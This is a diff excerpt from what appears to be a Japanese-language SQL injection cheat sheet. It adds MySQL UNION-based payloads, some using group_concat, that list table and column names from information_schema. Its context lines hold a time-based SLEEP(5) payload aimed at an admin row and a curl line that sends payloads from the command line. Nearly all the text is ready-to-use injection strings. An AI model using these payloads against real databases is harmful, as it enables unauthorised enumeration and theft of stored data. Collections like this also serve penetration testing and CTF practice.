@@ -43,10 +43,12 @@ UNION SELECT SLEEP(5),2 from テーブル名 where カラム名='admin' and カ�
 curl <url> -d "<sql>;-- -" #コマンドラインからcurlでもできる
 
 //テーブル名：カラムの名前とテーブル名をセットで列挙
-UNION SELECT column_name, table_name, null from information_schema.columns;-- -
+'union select column_name, table_name, null from information_schema.columns;-- -
+'union select group_concat(table_name, ':', column_name) from information_schema.columns where table_schema='<DB名>';-- - #group_concatを使ってテーブル名：カラム名の形で表示
 
 //テーブル情報の列挙
 'union select null,null,table_name FROM information_schema.tables;-- - #mysqlの場合
+'union select group_concat(table_name) from information_schema.tables where table_schema='<DB名>';-- - #group_concatを用いた列挙
 
 //カラム情報の列挙
 union select null, null, column_name from information_schema.columns;-- -　#mysqlの場合
